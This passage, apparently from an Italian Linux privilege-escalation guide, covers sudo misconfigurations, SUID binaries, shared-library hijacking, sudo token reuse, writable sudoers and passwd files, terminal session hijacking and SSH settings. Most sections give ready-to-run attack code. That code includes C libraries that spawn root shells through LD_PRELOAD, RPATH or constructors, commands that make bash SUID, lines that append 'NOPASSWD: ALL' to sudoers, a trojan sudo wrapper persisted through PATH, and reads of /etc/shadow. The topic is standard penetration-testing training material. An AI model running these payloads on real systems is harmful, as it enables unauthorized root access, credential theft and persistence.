Le variabili Terraform possono essere fornite tramite variabili d’ambiente `TF_VAR_<name>` se la specifica regola sudo le mantiene. Per leggere un source-symlink serve anche un provider che segua il link e copi il risultato protetto in una destinazione leggibile dal chiamante. Per scrivere tramite un destination-symlink servono invece una voce di destinazione controllata dal chiamante e un provider con privilegi che la segua in scrittura; un job pianificato in seguito è solo una delle possibili conseguenze. Prima di testare uno dei due percorsi, esamina la regola sudo esatta, i file `.tf` pertinenti, la configurazione CLI selezionata e la proprietà dei percorsi usando comandi di sola lettura come `sudo -l`, `stat` e `readlink`. Le validazioni lessicali deboli, come `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")`, non risolvono i symlink:<sup>[[25]](#references)</sup>

```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```

Terraform risolve il symlink e copia il vero `/root/root.txt` in una destinazione leggibile dall’attaccante. Lo stesso approccio può essere usato per **scrivere** in percorsi privilegiati creando in anticipo symlink nella destinazione (ad esempio, puntando il percorso di destinazione del provider a una directory interna a `/etc/cron.d/`).

### requiretty / !requiretty

Su alcune distribuzioni meno recenti, sudo può essere configurato con `requiretty`, che impone l’esecuzione di sudo solo da un TTY interattivo. Se è impostato `!requiretty` (o l’opzione è assente), sudo può essere eseguito da contesti non interattivi, come reverse shells, cron job o script.

```bash
Defaults !requiretty
```

Questo non è di per sé una vulnerabilità diretta, ma amplia i casi in cui le regole sudo possono essere abusate senza bisogno di una PTY completa.

### Sudo env_keep+=PATH / secure_path non sicuro → PATH hijack

Se `sudo -l` mostra `env_keep+=PATH` o un `secure_path` contenente voci scrivibili dall'attaccante (ad es., `/home/<user>/bin`), un comando esterno non qualificato all'interno del target consentito da sudo potrebbe essere oscurato.<sup>[[3]](#references)</sup> Anche l'assenza di un `secure_path` effettivo merita un'analisi **se** l'ambiente sudo del comando conserva un `PATH` controllato dal chiamante; la sola assenza non dimostra che sia così. Leggi lo script consentito senza eseguirlo, quindi verifica la regola esatta per RunAs e gli argomenti, il percorso di ricerca effettivo dei comandi e la presenza di una directory scrivibile e accessibile che preceda le altre e contenga il nome del comando. L'autenticazione, `NOEXEC`, i shell builtins e i percorsi assoluti dei comandi possono cambiare l'esito.

- Requisiti: una regola sudo (spesso `NOPASSWD`) che esegue uno script/binario che richiama comandi senza percorsi assoluti (`free`, `df`, `ps`, ecc.) e una voce PATH scrivibile che viene cercata per prima.

```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```

### Bypass dell’esecuzione di Sudo tramite percorsi
**Salta** per leggere altri file o usa **symlinks**. Ad esempio, nel file sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_

```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```

Se viene usato un **wildcard** (\*), è ancora più semplice:

```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```

**Contromisure**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Comando sudo/binario SUID senza percorso del comando

Se il **permesso sudo** è concesso per un singolo comando **senza specificarne il percorso**: _hacker10 ALL= (root) less_, puoi sfruttarlo modificando la variabile PATH

```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```

Questa tecnica può essere usata anche se un binario **suid** **esegue un altro comando senza specificarne il percorso (controlla sempre con** _**strings**_ **il contenuto di un binario SUID sospetto)**.

[Esempi di payload da eseguire.](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### Binario SUID con percorso del comando

Se il binario **suid** **esegue un altro comando specificandone il percorso**, puoi provare a **esportare una funzione** con lo stesso nome del comando richiamato dal file suid.

Ad esempio, se un binario suid richiama _**/usr/sbin/service apache2 start**_, devi provare a creare ed esportare la funzione:

```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```

Poi, quando chiami il binario SUID, questa funzione verrà eseguita

### Wrapper personalizzati SUID per la copia

Un'utilità SUID di proprietà di root che accetta percorsi di origine e destinazione può oltrepassare due diversi confini di fiducia. Se costruisce un comando shell usando uno dei due argomenti (per esempio, passando a `system()` un comando `cp` costruito ad hoc), i metacaratteri della shell possono eseguire un altro comando con i privilegi effettivi dell'utilità. Anche se invoca `cp` in modo sicuro, senza usare una shell, una destinazione senza restrizioni può consentire scritture privilegiate arbitrarie su file come `/etc/passwd`. Esamina la gestione degli argomenti del wrapper, il comportamento dell'UID effettivo, le restrizioni sulla destinazione e se il file copiato mantiene contenuti controllabili dal chiamante; un errore generico di `cp` o il solo bit SUID non dimostrano nessuno dei due scenari. Prima di qualsiasi test manuale, elenca il binario e i relativi permessi senza intervenire.

### Script scrivibile eseguito da un wrapper SUID

Un errore di configurazione comune nelle app personalizzate è un wrapper binario SUID di proprietà di root che esegue uno script, mentre lo script stesso è scrivibile da utenti con privilegi limitati.

Schema tipico:

```c
int main(void) {
    system("/bin/bash /usr/local/bin/backup.sh");
}
```

Se `/usr/local/bin/backup.sh` è scrivibile, puoi accodare comandi payload e poi eseguire il wrapper SUID:

```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```

Controlli rapidi:

```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```

Questo percorso di attacco è particolarmente comune nei wrapper di "maintenance"/"backup distribuiti in `/usr/local/bin`.

### LD_PRELOAD & **LD_LIBRARY_PATH**

La variabile d'ambiente **LD_PRELOAD** viene usata per specificare una o più librerie condivise (file .so) da caricare dal loader prima di tutte le altre, inclusa la libreria C standard (`libc.so`). Questo processo è noto come preloading di una libreria.

Tuttavia, per mantenere la sicurezza del sistema e impedire che questa funzionalità venga sfruttata, in particolare con gli eseguibili **suid/sgid**, il sistema impone determinate condizioni:

- Il loader ignora **LD_PRELOAD** per gli eseguibili in cui l'ID utente reale (_ruid_) non corrisponde all'ID utente effettivo (_euid_).
- Per gli eseguibili con suid/sgid, vengono precaricate solo le librerie nei percorsi standard che hanno anch'esse suid/sgid.

La privilege escalation può verificarsi se hai la possibilità di eseguire comandi con `sudo` e l'output di `sudo -l` include l'istruzione **env_keep+=LD_PRELOAD**. Questa configurazione consente alla variabile d'ambiente **LD_PRELOAD** di persistere e di essere riconosciuta anche quando i comandi vengono eseguiti con `sudo`, consentendo potenzialmente l'esecuzione di codice arbitrario con privilegi elevati.<sup>[[9]](#references)</sup>

```
Defaults        env_keep += LD_PRELOAD
```

Salva come **/tmp/pe.c**

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

Quindi **compilalo** usando:

```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

Infine, **escalate privileges** eseguendo

```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```

> [!CAUTION]
> Una privesc simile può essere sfruttata se l’attaccante controlla la variabile d’ambiente **LD_LIBRARY_PATH**, perché controlla il percorso in cui verranno cercate le librerie.

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```

### SUID Binary – injection .so

Quando si trova un binary con permessi **SUID** che sembra insolito, è buona prassi verificare che carichi correttamente i file **.so**. È possibile controllarlo eseguendo il seguente comando:<sup>[[17]](#references)</sup>

```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```

Ad esempio, imbattersi in un errore come _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ suggerisce una potenziale opportunità di exploitation.

Per sfruttarla, si procederebbe creando un file C, ad esempio _"/path/to/.config/libcalc.c"_, contenente il seguente codice:

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

Questo codice, una volta compilato ed eseguito, mira a elevare i privilegi manipolando i permessi dei file ed eseguendo una shell con privilegi elevati.

Compila il file C precedente in un oggetto condiviso (.so) con:

```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```

Infine, l'esecuzione del binario SUID interessato dovrebbe attivare l'exploit, consentendo una potenziale compromissione del sistema.

## Shared Object Hijacking

```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

Ora che abbiamo trovato un binario SUID che carica una libreria da una cartella in cui possiamo scrivere, creiamo la libreria in quella cartella con il nome necessario:

```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

Se ricevi un errore come

```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```

questo significa che la libreria che hai generato deve avere una funzione chiamata `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) è un elenco curato di binari Unix che un attacker può sfruttare per aggirare le restrizioni di sicurezza locali. [**GTFOArgs**](https://gtfoargs.github.io/) è lo stesso, ma per i casi in cui puoi **iniettare solo argomenti** in un comando.

Il progetto raccoglie funzioni legittime dei binari Unix che possono essere abusate per uscire da shell con restrizioni, elevare o mantenere privilegi elevati, trasferire file, avviare bind shell e reverse shell e facilitare altre attività di post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Se puoi accedere a `sudo -l`, puoi usare lo strumento [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) per verificare se trova un modo per sfruttare una qualsiasi regola di sudo.

### Riutilizzare i token di sudo

Nei casi in cui hai **accesso a sudo** ma non conosci la password, puoi elevare i privilegi **attendendo l'esecuzione di un comando sudo e poi dirottando il token di sessione**.<sup>[[18]](#references)</sup>

Requisiti per elevare i privilegi:

- Hai già una shell come utente "_sampleuser_"
- "_sampleuser_" ha **usato `sudo`** per eseguire qualcosa negli **ultimi 15 minuti** (per impostazione predefinita, questa è la durata del token di sudo che consente di usare `sudo` senza inserire password)
- `cat /proc/sys/kernel/yama/ptrace_scope` restituisce 0
- `gdb` è accessibile (puoi caricarlo)

(Puoi abilitare temporaneamente `ptrace_scope` con `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` oppure modificarlo in modo permanente intervenendo su `/etc/sysctl.d/10-ptrace.conf` e impostando `kernel.yama.ptrace_scope = 0`.)

Se tutti questi requisiti sono soddisfatti, **puoi elevare i privilegi usando:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- Il **primo exploit** (`exploit.sh`) crea il binario `activate_sudo_token` in _/tmp_. Puoi usarlo per **attivare il token di sudo nella tua sessione** (non otterrai automaticamente una shell root; esegui `sudo su`):

```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```

- Il **second exploit** (`exploit_v2.sh`) creerà una shell sh in _/tmp_ **di proprietà di root con setuid**

```bash
bash exploit_v2.sh
/tmp/sh -p
```

- Il **terzo exploit** (`exploit_v3.sh`) **creerà un file sudoers** che rende **eterni i token sudo e consente a tutti gli utenti di usare sudo**.

```bash
bash exploit_v3.sh
sudo su
```

### /var/run/sudo/ts/\<Username>

Se hai **permessi di scrittura** nella cartella o su uno qualsiasi dei file creati al suo interno, puoi usare il binario [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) per **creare un token sudo per un utente e un PID**.\
Ad esempio, se puoi sovrascrivere il file _/var/run/sudo/ts/sampleuser_ e hai una shell come quell'utente con PID 1234, puoi **ottenere privilegi sudo** senza conoscere la password, eseguendo:

```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```

### /etc/sudoers, /etc/sudoers.d

Il file `/etc/sudoers` e i file contenuti in `/etc/sudoers.d` configurano chi può usare `sudo` e in che modo. Per impostazione **predefinita, questi file possono essere letti solo dall'utente root e dal gruppo root**.\
**Se** puoi **leggere** questo file, potresti riuscire a **ottenere informazioni interessanti** e, se puoi **scrivere** su un qualsiasi file, potrai **escalare i privilegi**.

```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```

Se puoi scrivere, puoi abusare di questo permesso.

```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```

Un altro modo per abusare di questi permessi:

```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```

### DOAS

Esistono alcune alternative al binario `sudo`, come `doas` per OpenBSD; ricordati di controllare la configurazione in `/etc/doas.conf`

```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```

Se `doas` consente l'uso di un editor o di un interprete, verifica le escape in stile GTFOBins:

```bash
doas vim
:!/bin/sh
```

Una regola `doas` che consente di ottenere privilegi root per l'originale `dstat` basato su Python merita anche una verifica del percorso dei plugin. Il [manuale](https://github.com/dstat-real/dstat/blob/master/docs/dstat.1) e il [codice sorgente](https://github.com/dstat-real/dstat/blob/master/dstat) elencano `/usr/share/dstat/` e `/usr/local/share/dstat/` tra le directory in cui si trovano i plugin `dstat_*.py`. Se l'utente corrente può scrivere in una directory effettivamente usata dalla versione installata e accedervi, un plugin selezionato potrebbe essere eseguito con l'identità RunAs di `doas`. Verifica la regola effettiva, il modo in cui quella versione cerca i plugin, i permessi o le ACL della directory e delle directory genitrici e se chi invoca il comando può selezionare un plugin: una regola `dstat` o una directory scrivibile, da sole, sono solo indizi. Altre implementazioni di `dstat` possono usare sistemi di plugin diversi. Esamina i metadati passivamente, senza caricare plugin.

### Sudo Hijacking

Se sai che **un utente si connette abitualmente a una macchina e usa `sudo`** per elevare i privilegi e hai ottenuto una shell nel contesto di quell'utente, puoi **creare un nuovo eseguibile `sudo`** che esegua il tuo codice come root e poi il comando dell'utente. Quindi, **modifica il `$PATH`** del contesto utente (per esempio aggiungendo il nuovo percorso a `.bash_profile`), in modo che quando l'utente esegue `sudo` venga eseguito il tuo eseguibile `sudo`.

Tieni presente che, se l'utente usa una shell diversa (non bash), dovrai modificare altri file per aggiungere il nuovo percorso. Per esempio, [sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifica `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Puoi trovare un altro esempio in [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Oppure eseguendo qualcosa del tipo:

```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```

## Libreria condivisa

### ld.so

Il file `/etc/ld.so.conf` indica **da dove provengono i file di configurazione caricati**. In genere, questo file contiene il seguente percorso: `include /etc/ld.so.conf.d/*.conf`

Ciò significa che verranno letti i file di configurazione in `/etc/ld.so.conf.d/*.conf`. Questi file di configurazione **indicano altre cartelle** in cui verranno **cercate** le **librerie**. Per esempio, il contenuto di `/etc/ld.so.conf.d/libc.conf` è `/usr/local/lib`. **Questo significa che il sistema cercherà le librerie in `/usr/local/lib`**.

Se, per qualche motivo, **un utente ha i permessi di scrittura** su uno qualsiasi dei percorsi indicati: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, qualsiasi file all'interno di `/etc/ld.so.conf.d/` o qualsiasi cartella specificata nel file di configurazione all'interno di `/etc/ld.so.conf.d/*.conf`, potrebbe riuscire a ottenere un'escalation dei privilegi.\
Dai un'occhiata a **come eseguire l'exploit di questa configurazione errata** nella pagina seguente:


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH

```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x0068c000)
 libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x005bb000)
```

Copiando la libreria in `/var/tmp/flag15/`, verrà utilizzata dal programma in questa posizione, come specificato nella variabile `RPATH`.

```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x005b0000)
 libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x00737000)
```

Quindi crea una libreria malevola in `/var/tmp` con `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`

```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
 char *file = SHELL;
 char *argv[] = {SHELL,0};
 setresuid(geteuid(),geteuid(), geteuid());
 execve(file,argv,0);
}
```

## Capabilities

Le capabilities di Linux forniscono a un processo un **sottoinsieme dei privilegi root disponibili**. In pratica, suddividono i **privilegi root in unità più piccole e distinte**. Ognuna di queste unità può quindi essere concessa ai processi in modo indipendente. In questo modo, il set completo di privilegi viene ridotto, diminuendo i rischi di exploitation.\
Leggi la seguente pagina per **approfondire le capabilities e come abusarne**:


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Directory permissions

In una directory, il **bit "execute"** consente all'utente interessato di usare "**cd**" per entrare nella cartella.\
Il bit **"read"** consente all'utente di **elencare** i **file**, mentre il bit **"write"** consente di **eliminare** e **creare** nuovi **file**.

## ACLs

Le Access Control Lists (ACL) rappresentano il livello secondario di autorizzazioni discrezionali, in grado di **sovrascrivere le tradizionali autorizzazioni ugo/rwx**. Queste autorizzazioni migliorano il controllo sull'accesso ai file o alle directory, consentendo o negando i diritti a utenti specifici che non ne sono proprietari e non fanno parte del gruppo. Questo livello di **granularità garantisce una gestione degli accessi più precisa**. Puoi trovare ulteriori dettagli [**qui**](https://linuxconfig.org/how-to-manage-acls-on-linux).<sup>[[19]](#references)</sup>

**Concedi** all'utente "kali" i permessi di lettura e scrittura su un file:

```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```

**Ottieni** file con ACL specifiche dal sistema:

```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```

### Backdoor ACL nascosta nei file aggiuntivi di sudoers

Una configurazione errata comune è un file in `/etc/sudoers.d/` di proprietà di root e con permessi `440`, che concede comunque accesso in scrittura a un utente con privilegi bassi tramite ACL.

```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```

Se vedi qualcosa come `user:alice:rw-`, l'utente può aggiungere una regola sudo nonostante i bit dei permessi restrittivi:

```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```

Questo è un percorso di persistence/privesc tramite ACL ad alto impatto, perché è facile non notarlo se si esamina solo l’output di `ls -l`.

## Sessioni shell aperte

L’accesso cross-user a GNU Screen dipende dalla **configurazione e dall’ACL della sessione in esecuzione**, non solo dalla sua versione. [La documentazione di GNU Screen](https://www.gnu.org/software/screen/manual/html_node/Multiuser-Session.html) specifica che deve essere compilato con il supporto multiuser; `multiuser on` e un’autorizzazione `acladd` o un `aclchg` adeguato consentono a un altro utente di collegarsi. [Il manuale richiede anche setuid-root](https://www.gnu.org/software/screen/manual/html_node/Invoking-Screen.html) per la ricerca cross-user della sessione. La presenza di un socket visibile di proprietà di root o di un binario `screen` SUID, da sola, non dimostra che sia possibile collegarsi a una shell di root. Prima di considerarlo un’escalation, verifica che la sessione attiva sia multiuser, che l’utente corrente abbia i permessi effettivi di input/esecuzione dei comandi e che la shell nella sessione sia eseguita con i privilegi del proprietario.

### Hijacking delle sessioni screen

**Elencare le sessioni screen**

```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```

![screen sessions hijacking - Posizioni dei socket (alcuni sistemi ne espongono uno come symlink dell’altro): ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**Collegarsi a una sessione**

```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```

## Hijacking delle sessioni tmux

Questo era un problema delle **vecchie versioni di tmux**. Non sono riuscito a hijackare una sessione tmux (v2.1) creata da root come utente non privilegiato.

**Elencare le sessioni tmux**

```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```

![Posizioni dei socket (alcuni sistemi espongono uno come symlink dell'altro) - tmux sessions hijacking: tmux -S /tmp/dev sess ls Elenca le sessioni usando quel socket; puoi avviare una sessione tmux su quel socket...](<../../images/image (837).png>)

**Collegarsi a una sessione**

```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```

Controlla **Valentine box from HTB** per un esempio.

## SSH

### PRNG prevedibile di OpenSSL su Debian - CVE-2008-0166

Le chiavi generate con build di OpenSSL Debian o derivate durante il periodo storico in cui erano vulnerabili potrebbero avere casualità prevedibile; la distribuzione attuale dell'host o la versione di OpenSSL aggiornata non permettono di stabilire come sia stata generata una chiave precedente. Verifica la **chiave specifica** con una blacklist storica adeguata e controllane la provenienza. Il [manuale di `ssh-vulnkey` di Debian](https://manpages.debian.org/wheezy/openssh-client/ssh-vulnkey.1.en.html) descrive come verificare le chiavi pubbliche e `authorized_keys`, mentre [DSA-1571-1](https://security-tracker.debian.org/tracker/DSA-1571-1) documenta la correzione di OpenSSL. Una voce in `authorized_keys` di un account privilegiato è una possibile pista per l'escalation solo se la chiave privata corrispondente è recuperabile e la policy SSH effettiva accetta ancora quella chiave per l'account; una chiave **host** debole non è di per sé una credenziale di accesso. Sostituisci le chiavi compromesse e rimuovi le relative autorizzazioni precedenti.

### Valori di configurazione SSH interessanti

- **PasswordAuthentication:** specifica se è consentita l'autenticazione con password. Il valore predefinito di OpenSSH upstream è `yes`; la configurazione della distribuzione può modificarlo.
- **PubkeyAuthentication:** specifica se è consentita l'autenticazione con chiave pubblica. Il valore predefinito è `yes`.
- **PermitEmptyPasswords**: quando è consentita l'autenticazione con password, specifica se il server consente l'accesso agli account con password vuote. Il valore predefinito è `no`.

### File di controllo dell'accesso

Questi file influiscono su chi può accedere e in che modo:

- **`/etc/nologin`**: se presente, blocca gli accessi degli utenti non root e mostra il relativo messaggio.
- **`/etc/securetty`**: limita i terminali da cui root può accedere (allowlist TTY).
- **`/etc/motd`**: banner mostrato dopo l'accesso (può esporre dettagli sull'ambiente o sulla manutenzione).

### PermitRootLogin

Specifica se root può accedere tramite ssh. Il valore predefinito di OpenSSH upstream è `prohibit-password`; la configurazione della distribuzione può modificarlo. Valori possibili:

- `yes`: root può accedere usando password e chiave privata
- `without-password` o `prohibit-password`: root può accedere solo con una chiave privata
- `forced-commands-only`: Root può accedere solo usando una chiave privata e se sono specificate le opzioni dei comandi
- `no` : no

### Autorità di certificazione SSH attendibili per gli utenti

`TrustedUserCAKeys` indica le chiavi pubbliche di cui sshd si fida per firmare i certificati **utente**. Se la chiave privata CA corrispondente è leggibile da un utente con privilegi inferiori, verifica chi può ottenere un certificato e con quali principal può autenticarsi. `AuthorizedPrincipalsFile` o `AuthorizedPrincipalsCommand` possono limitare i nomi accettati; se nessuno dei due è configurato, il certificato deve contenere il nome dell'account di destinazione. `PermitRootLogin prohibit-password` blocca l'autenticazione di root tramite password, ma può comunque consentire quella tramite certificato. La sola presenza di un percorso della chiave esposto non dimostra l'accesso: verifica la coppia di chiavi pubblica/privata, le regole `Match` effettive, la policy dell'account, la passphrase della chiave, la revoca e gli algoritmi di firma accettati. Non includere i byte delle chiavi private nell'output di enumerazione. Consulta il [manuale di configurazione del server OpenSSH](https://man.openbsd.org/sshd_config#TrustedUserCAKeys).

Una chiave privata CA può essere utilizzabile anche **senza essere leggibile** dall'utente corrente, se una regola di delega dei privilegi consente a tale utente di eseguire un [firmatario di certificati non limitato, come `ssh-keygen -s`](https://man.openbsd.org/ssh-keygen#-s), con l'identità del proprietario della chiave. Verifica la corrispondenza tra il comando e gli argomenti esatti consentiti, l'accesso del firmatario alla chiave, la CA pubblica considerata attendibile dalla configurazione effettiva di sshd, il principal accettato per l'account di destinazione, la validità del certificato e la policy di accesso dell'account. Un comando di firma delegato o un file CA attendibile, da soli, non dimostrano l'accesso a un altro account; non firmare un certificato di prova durante l'enumerazione passiva.

### AuthorizedKeysFile

Specifica i file che contengono le chiavi pubbliche utilizzabili per l'autenticazione degli utenti. Può contenere token come `%h`, che verrà sostituito con la directory home. **È possibile indicare percorsi assoluti** (che iniziano con `/`) oppure **percorsi relativi alla home dell'utente**. Per esempio:

```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```

Questa configurazione indica che, se provi ad accedere con la chiave **privata** dell'utente "**testusername**", ssh confronterà la chiave pubblica della tua chiave con quelle presenti in `/home/testusername/.ssh/authorized_keys` e `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

Il forwarding dell'agent SSH consente di **usare le chiavi SSH locali invece di lasciare le chiavi** (senza passphrase!) sul server. Potrai quindi **passare** via ssh **a un host** e da lì **passare a un altro host** **usando** la **chiave** che si trova sull'**host iniziale**.

Devi impostare questa opzione in `$HOME/.ssh.config` in questo modo:

```
Host example.com
  ForwardAgent yes
```

Nota che se `Host` è `*`, ogni volta che l’utente passa a un’altra macchina, quell’host potrà accedere alle chiavi (il che rappresenta un problema di sicurezza).

Il file `/etc/ssh_config` può **sovrascrivere** queste **opzioni** e consentire o negare questa configurazione.\
Il file `/etc/sshd_config` può **consentire** o **negare** l’inoltro di ssh-agent tramite la parola chiave `AllowAgentForwarding` (consentito per impostazione predefinita).

Se scopri che l’inoltro di ssh-agent è configurato in un ambiente, consulta la seguente pagina: **potresti riuscire a sfruttarlo per elevare i privilegi**:


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## File interessanti

### File di profilo

Il file `/etc/profile` e i file nella directory `/etc/profile.d/` sono **script eseguiti quando un utente avvia una nuova shell**. Pertanto, se puoi **scriverne o modificarne uno qualsiasi, puoi elevare i privilegi**.

```bash
ls -l /etc/profile /etc/profile.d/
```

Se viene trovato uno script di profilo insolito, controllalo per individuare **dettagli sensibili**.

### File Passwd/Shadow

A seconda del sistema operativo, i file `/etc/passwd` e `/etc/shadow` potrebbero avere nomi diversi o potrebbe esserci una copia di backup. È quindi consigliabile **trovarli tutti** e **verificare se sono leggibili**, per vedere **se contengono hash**:

```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```

In alcuni casi è possibile trovare **hash delle password** all'interno del file `/etc/passwd` (o equivalente)

```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```

### /etc/passwd scrivibile

Per prima cosa, genera una password con uno dei seguenti comandi.

```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```

Quindi aggiungi l'utente hacker e inserisci la password generata.

```
